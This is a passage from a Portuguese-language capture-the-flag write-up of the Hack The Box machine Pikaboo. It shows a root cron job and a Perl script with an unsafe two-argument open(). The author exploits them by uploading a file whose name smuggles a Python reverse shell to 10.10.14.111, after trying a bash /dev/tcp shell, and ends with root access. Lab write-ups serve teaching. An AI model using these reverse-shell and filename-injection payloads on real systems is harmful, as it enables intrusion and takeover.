+<span class="c"># /etc/crontab: system-wide crontab</span>
+<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
+<span class="c"># command to install the new version when you edit this file</span>
+<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c"># that none of the other crontabs do.</span>
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span class="c"># Example of job definition:</span>
+<span class="c"># .---------------- minute (0 - 59)</span>
+<span class="c"># |  .------------- hour (0 - 23)</span>
+<span class="c"># |  |  .---------- day of month (1 - 31)</span>
+<span class="c"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+<span class="c"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+<span class="c"># |  |  |  |  |</span>
+<span class="c"># *  *  *  *  * user-name command to be executed</span>
+17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
+25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
+47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
+52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
+<span class="c">#</span>
+<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root /usr/local/bin/csvupdate_cron
+
+www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>file /usr/local/bin/csvupdate_cron
+file /usr/local/bin/csvupdate_cron
+/usr/local/bin/csvupdate_cron: Bourne-Again shell script, ASCII text executable
+
+</code></pre></div></div>
+
+<p>Aparentemente é um script que faz alguma coisa a cada segundo, vamos enumerar o script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/csvupdate_cron
+<span class="nb">cat</span> /usr/local/bin/csvupdate_cron
+<span class="c">#!/bin/bash</span>
+
+<span class="k">for </span>d <span class="k">in</span> /srv/ftp/<span class="k">*</span>
+<span class="k">do
+  </span><span class="nb">cd</span> <span class="nv">$d</span>
+  /usr/local/bin/csvupdate <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span> <span class="k">*</span>csv
+  /usr/bin/rm <span class="nt">-rf</span> <span class="k">*</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>Interpretando o scrpt, podemos identificar que ele abre cada diretório dentro de <code class="language-plaintext highlighter-rouge">/srv/ftp/</code> e roda o script <code class="language-plaintext highlighter-rouge">/usr/local/bin/csvupdate</code> para cada arquivo terminado em <code class="language-plaintext highlighter-rouge">csv</code>, porém o script utiliza <code class="language-plaintext highlighter-rouge">basename</code> no nome do arquivo, para excluir tudo que vier antes de <code class="language-plaintext highlighter-rouge">"/"</code>, logo em seguida, o script remove todos os arquivos dento do diretório de trabalho.</p>
+
+<p>Como ele roda outro script, o <code class="language-plaintext highlighter-rouge">/usr/local/bin/csvupdate</code>, vamos enumerá-lo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>file /usr/local/bin/csvupdate
+file /usr/local/bin/csvupdate
+/usr/local/bin/csvupdate: Perl script text executable
+www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/csvupdate
+<span class="nb">cat</span> /usr/local/bin/csvupdate
+<span class="c">#!/usr/bin/perl</span>
+
+<span class="c">##################################################################</span>
+<span class="c"># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #</span>
+<span class="c">#                                                                #</span>
+<span class="c"># Usage:                                                         #</span>
+<span class="c"># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #</span>
+<span class="c">#                                                                #</span>
+<span class="c"># Arguments:                                                     #</span>
+<span class="c"># - type: PokeAPI CSV file type                                  #</span>
+<span class="c">#         (must have the correct number of fields)               #</span>
+<span class="c"># - file(s): list of files containing CSV data                   #</span>
+<span class="c">##################################################################</span>
+
+use strict<span class="p">;</span>
+use warnings<span class="p">;</span>
+use Text::CSV<span class="p">;</span>
+
+my <span class="nv">$csv_dir</span> <span class="o">=</span> <span class="s2">"/opt/pokeapi/data/v2/csv"</span><span class="p">;</span>
+
+my %csv_fields <span class="o">=</span> <span class="o">(</span>
+  <span class="s1">'abilities'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'ability_changelog'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'ability_changelog_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'ability_flavor_text'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'ability_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'ability_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'berries'</span> <span class="o">=&gt;</span> 10,
+  <span class="s1">'berry_firmness'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'berry_firmness_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'berry_flavors'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'characteristics'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'characteristic_text'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_episode_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_episodes'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_episode_warriors'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_kingdom_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_kingdoms'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_max_links'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_move_data'</span> <span class="o">=&gt;</span> 7,
+  <span class="s1">'conquest_move_displacement_prose'</span> <span class="o">=&gt;</span> 5,
+  <span class="s1">'conquest_move_displacements'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_move_effect_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'conquest_move_effects'</span> <span class="o">=&gt;</span> 1,
+  <span class="s1">'conquest_move_range_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'conquest_move_ranges'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_pokemon_abilities'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_pokemon_evolution'</span> <span class="o">=&gt;</span> 8,
+  <span class="s1">'conquest_pokemon_moves'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_pokemon_stats'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_stat_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_stats'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_transformation_pokemon'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_transformation_warriors'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_warrior_archetypes'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_warrior_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_warrior_ranks'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'conquest_warrior_rank_stat_map'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_warriors'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'conquest_warrior_skill_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_warrior_skills'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_warrior_specialties'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_warrior_stat_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'conquest_warrior_stats'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'conquest_warrior_transformation'</span> <span class="o">=&gt;</span> 10,
+  <span class="s1">'contest_combos'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'contest_effect_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'contest_effects'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'contest_type_names'</span> <span class="o">=&gt;</span> 5,
+  <span class="s1">'contest_types'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'egg_group_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'egg_groups'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'encounter_condition_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'encounter_conditions'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'encounter_condition_value_map'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'encounter_condition_value_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'encounter_condition_values'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'encounter_method_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'encounter_methods'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'encounters'</span> <span class="o">=&gt;</span> 7,
+  <span class="s1">'encounter_slots'</span> <span class="o">=&gt;</span> 5,
+  <span class="s1">'evolution_chains'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'evolution_trigger_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'evolution_triggers'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'experience'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'genders'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'generation_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'generations'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'growth_rate_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'growth_rates'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_categories'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_category_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_flag_map'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'item_flag_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'item_flags'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'item_flavor_summaries'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_flavor_text'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'item_fling_effect_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_fling_effects'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'item_game_indices'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_pocket_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'item_pockets'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'item_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'items'</span> <span class="o">=&gt;</span> 6,
+  <span class="s1">'language_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'languages'</span> <span class="o">=&gt;</span> 6,
+  <span class="s1">'location_area_encounter_rates'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'location_area_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'location_areas'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'location_game_indices'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'location_names'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'locations'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'machines'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'move_battle_style_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_battle_styles'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'move_changelog'</span> <span class="o">=&gt;</span> 10,
+  <span class="s1">'move_damage_classes'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'move_damage_class_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'move_effect_changelog'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_effect_changelog_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_effect_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'move_effects'</span> <span class="o">=&gt;</span> 1,
+  <span class="s1">'move_flag_map'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'move_flag_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'move_flags'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'move_flavor_summaries'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_flavor_text'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'move_meta_ailment_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_meta_ailments'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'move_meta_categories'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'move_meta_category_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_meta'</span> <span class="o">=&gt;</span> 13,
+  <span class="s1">'move_meta_stat_changes'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'move_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'moves'</span> <span class="o">=&gt;</span> 15,
+  <span class="s1">'move_target_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'move_targets'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'nature_battle_style_preferences'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'nature_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'nature_pokeathlon_stats'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'natures'</span> <span class="o">=&gt;</span> 7,
+  <span class="s1">'pal_park_area_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pal_park_areas'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pal_park'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokeathlon_stat_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokeathlon_stats'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokedexes'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokedex_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokedex_version_groups'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokemon_abilities'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_color_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_colors'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokemon'</span> <span class="o">=&gt;</span> 8,
+  <span class="s1">'pokemon_dex_numbers'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_egg_groups'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokemon_evolution'</span> <span class="o">=&gt;</span> 20,
+  <span class="s1">'pokemon_form_generations'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_form_names'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_form_pokeathlon_stats'</span> <span class="o">=&gt;</span> 5,
+  <span class="s1">'pokemon_forms'</span> <span class="o">=&gt;</span> 10,
+  <span class="s1">'pokemon_form_types'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_game_indices'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_habitat_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_habitats'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokemon_items'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_move_method_prose'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_move_methods'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokemon_moves'</span> <span class="o">=&gt;</span> 6,
+  <span class="s1">'pokemon_shape_prose'</span> <span class="o">=&gt;</span> 5,
+  <span class="s1">'pokemon_shapes'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'pokemon_species'</span> <span class="o">=&gt;</span> 20,
+  <span class="s1">'pokemon_species_flavor_summaries'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_species_flavor_text'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_species_names'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_species_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_stats'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'pokemon_types'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'pokemon_types_past'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'region_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'regions'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'stat_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'stats'</span> <span class="o">=&gt;</span> 5,
+  <span class="s1">'super_contest_combos'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'super_contest_effect_prose'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'super_contest_effects'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'type_efficacy'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'type_game_indices'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'type_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'types'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'version_group_pokemon_move_methods'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'version_group_regions'</span> <span class="o">=&gt;</span> 2,
+  <span class="s1">'version_groups'</span> <span class="o">=&gt;</span> 4,
+  <span class="s1">'version_names'</span> <span class="o">=&gt;</span> 3,
+  <span class="s1">'versions'</span> <span class="o">=&gt;</span> 3
+<span class="o">)</span><span class="p">;</span>
+
+
+<span class="k">if</span><span class="o">(</span><span class="nv">$#ARGV</span> &lt; 1<span class="o">)</span>
+<span class="o">{</span>
+  die <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;type&gt; &lt;file(s)&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="o">}</span>
+
+my <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$ARGV</span><span class="o">[</span>0]<span class="p">;</span>
+<span class="k">if</span><span class="o">(!</span>exists <span class="nv">$csv_fields</span><span class="o">{</span><span class="nv">$type</span><span class="o">})</span>
+<span class="o">{</span>
+  die <span class="s2">"Unrecognised CSV data type: </span><span class="nv">$type</span><span class="s2">.</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="o">}</span>
+
+my <span class="nv">$csv</span> <span class="o">=</span> Text::CSV-&gt;new<span class="o">({</span> sep_char <span class="o">=&gt;</span> <span class="s1">','</span> <span class="o">})</span><span class="p">;</span>
+
+my <span class="nv">$fname</span> <span class="o">=</span> <span class="s2">"</span><span class="k">${</span><span class="nv">csv_dir</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">type</span><span class="k">}</span><span class="s2">.csv"</span><span class="p">;</span>
+open<span class="o">(</span>my <span class="nv">$fh</span>, <span class="s2">"&gt;&gt;"</span>, <span class="nv">$fname</span><span class="o">)</span> or die <span class="s2">"Unable to open CSV target file.</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nb">shift</span><span class="p">;</span>
+<span class="k">for</span><span class="o">(</span>&lt;<span class="o">&gt;)</span>
+<span class="o">{</span>
+  chomp<span class="p">;</span>
+  <span class="k">if</span><span class="o">(</span><span class="nv">$csv</span>-&gt;parse<span class="o">(</span><span class="nv">$_</span><span class="o">))</span>
+  <span class="o">{</span>
+    my @fields <span class="o">=</span> <span class="nv">$csv</span>-&gt;fields<span class="o">()</span><span class="p">;</span>
+    <span class="k">if</span><span class="o">(</span>@fields <span class="o">!=</span> <span class="nv">$csv_fields</span><span class="o">{</span><span class="nv">$type</span><span class="o">})</span>
+    <span class="o">{</span>
+      warn <span class="s2">"Incorrect number of fields: '</span><span class="nv">$_</span><span class="s2">'</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+      next<span class="p">;</span>
+    <span class="o">}</span>
+    print <span class="nv">$fh</span> <span class="s2">"</span><span class="nv">$_</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+
+close<span class="o">(</span><span class="nv">$fh</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Ao ler o script, percebemos que ele basicamente faz suas alterações ao captar o nome do arquivo como um argumento, isso exploca o <code class="language-plaintext highlighter-rouge">"$(basename $d) *csv"</code> no script da cron.</p>
+
+<p>O pesquisar sobre vulnerabilidades em scripts Perl, encontrei este <a href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543">artigo</a>.</p>
+
+<p>Basicamente ele diz que se o nome do arquivo tiver um pipe <code class="language-plaintext highlighter-rouge">"|"</code>, o resto do nome do arquivo será executado como um comando, porém, a cron utiliza <code class="language-plaintext highlighter-rouge">basename</code>, então não podemos executar qualquer payload, se testarmos em nossa máquina local, veremos que o payload simples de reverse shell é cortado pelo basename.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span><span class="nb">basename</span> <span class="s1">'bash -c "/bin/bash -i &gt; /dev/tcp/10.10.14.111/8444 0&gt;&amp;1"'</span>
+8444 0&gt;&amp;1<span class="s2">"
+</span></code></pre></div></div>
+
+<p>O basename vai considerar só o que vem após o último <code class="language-plaintext highlighter-rouge">"/"</code>, então precisamos de outra alternativa.</p>
+
+<p>É possível obter um reverse shell através do <code class="language-plaintext highlighter-rouge">python</code>, sem utilizar <code class="language-plaintext highlighter-rouge">/</code>, vamos criar um arquivo para upload.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span><span class="nb">touch</span> <span class="s2">"|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((</span><span class="se">\"</span><span class="s2">10.10.14.111</span><span class="se">\"</span><span class="s2">,8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(</span><span class="se">\"</span><span class="s2">sh</span><span class="se">\"</span><span class="s2">)';.csv"</span>
+                                                                                                                     
+┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 8
+drwxr-xr-x  2 hastur hastur 4096 Sep 19 17:14  <span class="nb">.</span>
+drwxr-xr-x 36 hastur hastur 4096 Sep 19 15:42  ..
+<span class="nt">-rw-r--r--</span>  1 hastur hastur    0 Sep 19 17:14 <span class="s1">'|python -c '</span><span class="se">\'</span><span class="s1">'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.111",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</span><span class="se">\'</span><span class="s1">';.csv'</span>
+</code></pre></div></div>
+
+<p>O que precisamos fazer é setar um <code class="language-plaintext highlighter-rouge">netcat</code> na porta 8444 e enviar nosso arquivo para o diretório versions, que é onde temos permissão de escrita.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pikaboo]
+└─<span class="nv">$ </span>ftp 10.10.10.249
+Connected to 10.10.10.249.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.249:hastur<span class="o">)</span>: pwnmeow
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">cd </span>versions
+250 Directory successfully changed.
+ftp&gt; put <span class="s2">"|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("</span><span class="se">\"</span>10.10.14.111<span class="se">\"</span>,8444<span class="o">))</span><span class="p">;</span><span class="o">[</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,f<span class="o">)</span><span class="k">for</span><span class="se">\ </span>f<span class="se">\ </span><span class="k">in</span><span class="o">(</span>0,1,2<span class="o">)]</span><span class="p">;</span>pty.spawn<span class="o">(</span><span class="se">\"</span>sh<span class="se">\"</span><span class="o">)</span><span class="s1">';.csv"
+local: |python3 -c '</span>import os,pty,socket<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">()</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.14.111"</span>,8444<span class="o">))</span><span class="p">;</span><span class="o">[</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,f<span class="o">)</span><span class="k">for </span>f <span class="k">in</span><span class="o">(</span>0,1,2<span class="o">)]</span><span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"sh"</span><span class="o">)</span><span class="s1">';.csv remote: |python3 -c '</span>import os,pty,socket<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">()</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.14.111"</span>,8444<span class="o">))</span><span class="p">;</span><span class="o">[</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,f<span class="o">)</span><span class="k">for </span>f <span class="k">in</span><span class="o">(</span>0,1,2<span class="o">)]</span><span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"sh"</span><span class="o">)</span><span class="s1">';.csv
+sh: 1: .csv: not found
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+ftp&gt; 
+</span></code></pre></div></div>
+
+<p><img src="/img/htb/htb-pikaboo-12.png" /></p>
+
+<p>E conseguimos noss shell <code class="language-plaintext highlighter-rouge">root</code>, a flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no diretório <code class="language-plaintext highlighter-rouge">/root</code>.</p>
+
+<p>E comprometemos o server!!
+<br /></p>
+
+<p><img src="/img/htb/hackerman.gif" />
+<br /></p>
+<h3 id="referências">Referências</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Vulnerabilidade</th>
+      <th>Url</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Path traversal via misconfigured NGINX alias</td>
+      <td><a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/</a></td>
+    </tr>
+    <tr>
+      <td>Do not use the two-argument form of open()</td>
+      <td><a href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543">https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543</a></td>
+    </tr>
+  </tbody>
+</table>
+
